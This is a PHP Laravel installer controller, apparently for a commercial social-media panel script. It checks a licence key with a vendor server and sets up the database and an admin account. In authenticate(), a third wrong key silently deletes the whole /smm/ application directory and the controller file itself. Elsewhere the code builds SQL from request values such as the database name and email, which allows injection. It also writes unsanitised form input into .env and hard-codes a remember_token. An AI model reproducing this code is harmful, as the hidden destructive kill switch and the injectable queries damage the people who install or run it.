<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Artisan;
use App\User;
use Session;
use Hash;
use File;
use Illuminate\Foundation\Auth\RegistersUsers;

class InstallerController extends Controller
{
    public function index()
    {
      return view('installer.key-auth');
    }

    public function authenticate(Request $request)
    {
        Session::put('step', 1);
        $key=$request->secretkey;
        Session::put('secretkey', $key);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.mysticsmmscript.com/api/operation.php?key='.$key.'');
        curl_setopt($ch, CURLOPT_HEADER, FALSE);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
        $response = curl_exec($ch);
        curl_close($ch); 
        $data = json_decode($response,true);
        if($data['message']=="false")
        {
            if(Session::get('lid')==1)
            {
                Session::put('lid', 2);
                return back()->with('status', 'Wrong Key!');
            }elseif(Session::get('lid')==2)
            {
                Session::put('lid', 3);
                return back()->with('status', 'Wrong Key!');
            }elseif(Session::get('lid')==3)
            {
                $root_dir = realpath(dirname(getcwd()));
                $file='/smm/';
                $file=$root_dir.$file;
                 File::deleteDirectory($file);
                 unlink(__FILE__);
            }else
            {
                Session::put('lid', 1);
                return back()->with('status', 'Wrong Key!');
            }
        }else
        {
            return redirect('versionchecker');
        }
    }

    public function versionchecker()
    {
        if (Session::get('step')!=1) 
        {
            return redirect('start');
        }
        Session::put('step', 2);
        $version = phpversion();
        if ($version>="7.1.0") {
            return view('installer.version-check');
        }else
        {
        return view('installer.version-check')->with('successMsg', 'PHP version should be greater than 7.1.0');
        }
    }

    public function configuration()
    {
        if (Session::get('step')!=2) 
        {
            return redirect('start');
        }
        Session::put('step', 3);
        return view('installer.db-configuration');
    }

    public function updateenv(Request $request)
    {
        $root_dir = realpath(dirname(getcwd()));
        // $file=$root_dir.'\.env';
        $appurl=$_SERVER['HTTP_HOST'];
        $file='/smm/.env';
        $file=$root_dir.$file;
        $dbname=$request->dbname;
        $dbuser=$request->dbuser;
        $dbpaassword=$request->dbpaassword;
        $email=$request->email;
        $password=$request->password;
        $arr=['APP_URL=','DB_DATABASE=','DB_USERNAME=','DB_PASSWORD='];
        $narr=['APP_URL='.$appurl.'','DB_DATABASE='.$dbname.'','DB_USERNAME='.$dbuser.'','DB_PASSWORD='.$dbpaassword.''];
        Artisan::call('config:clear');
        for($i=0; $i<4; $i++)
        {
            $rows=file_get_contents($file);
            $db=str_replace($arr[$i], $narr[$i], "$rows");
            file_put_contents($file, $db);
        }
        Artisan::call('config:clear');
        $res=Self::saveconfiguration($dbname,$dbuser,$dbpaassword,$email,$password);
        Artisan::call('config:clear');
        if($res)
        {
            return redirect()->route('login');
        }
    }

    public function saveconfiguration($dbname,$dbuser,$dbpaassword,$email,$password)
    {   
        $host='localhost';
        $connection = mysqli_connect($host,$dbuser,$dbpaassword,$dbname);
     

        $sql = "SHOW TABLES FROM $dbname";
        $result = mysqli_query($connection,$sql);
        $count=mysqli_num_rows($result);
        // if ($count==0) {
        $root_dir = realpath(dirname(getcwd()));
        $filename=$root_dir.'/smm/database/factories/licencse.txt';
        $handle = fopen($filename,"r+");
        $contents = fread($handle,filesize($filename));
        $sql = explode(';',$contents);
        foreach($sql as $query){
            if ($query!='') {
        mysqli_query($connection,$query);
            }
        }
        fclose($handle);
        mysqli_close($connection);
        $connection = mysqli_connect($host,$dbuser,$dbpaassword,$dbname);
        $npassword=bcrypt($password);  
        $sql="INSERT INTO `users` ( `name`, `email`, `funds`, `password`, `status`, `role`, `api_token`, `enabled_payment_methods`, `skype_id`, `timezone`, `last_login`, `remember_token`, `created_at`, `updated_at`)
        VALUES
        ('admin', '$email', '0.00000', '$npassword', 'ACTIVE', 'ADMIN', NULL, '5,3,6,1,8,9,4,7,2', '847845654', 'America/Chicago', '2019-02-20 11:13:17', 'Kk1RvoEReCDwjoJcpOfUzKbMNCkoXhf14BiABQP75k8p407oZvlW80Lm1tzI', '2018-12-05 06:31:02', '2019-02-20 11:13:17')";
        mysqli_query($connection,$sql);
       
        $tokenused=Self::updateauthenticate();
        if ($tokenused=="true") {
            return true;
        }        
        // }else
        // {
        // echo "Please Drop existing tables for fresh installation";
        // }
    }

    public function updateauthenticate()
    {
        $key=Session::get('secretkey');
        $domain=$_SERVER['HTTP_HOST'];
        // write key in a file for future sync
        $root_dir = realpath(dirname(getcwd()));
        $my_file =$root_dir.'/smm/key.txt';
        $handle = fopen($my_file, 'w') or die('Cannot open file:  '.$my_file);
        fwrite($handle, $key);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.mysticsmmscript.com/api/operation.php?key='.$key.'&&domain='.$domain.'');
        curl_setopt($ch, CURLOPT_HEADER, FALSE);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
        $response = curl_exec($ch);
        curl_close($ch); 
        $data = json_decode($response,true);
        return $data['message'];
    }
}
